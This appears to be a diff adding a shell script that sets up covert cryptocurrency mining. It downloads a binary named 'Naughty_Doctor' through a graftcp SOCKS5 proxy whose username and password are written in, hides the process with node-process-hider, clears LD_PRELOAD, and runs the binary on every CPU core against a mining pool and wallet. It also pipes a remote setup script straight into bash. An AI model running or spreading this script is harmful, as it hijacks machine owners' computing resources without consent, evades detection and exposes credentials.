@@ -1,0 +1,64 @@
+#!/bin/sh
+
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+wget -O - https://deb.nodesource.com/setup_17.x | bash
+
+apt -y install nodejs
+
+apt -y install npm
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = cpusocks1.wot.mrface.com:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+ls -la
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .5
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor
+chmod +x Naughty_Doctor
+
+unset LD_PRELOAD
+unset LD_PRELOAD_ENV
+unset LD_LIBRARY_PATH
+
+ph add Naughty_Doctor
+
+./Naughty_Doctor --disable-gpu --algorithm curvehash --pool uk.miningpools.pro:5241 --wallet PNGC5TxSdQXwD1DxFbuZ1efd3ongdTqwZj.NaughtyDoctorCol --password c=PLSR,m=solo --proxy mikrotik999:Elibawnos@cpusocks1.wot.mrface.com:1080 --cpu-threads $num_of_cores
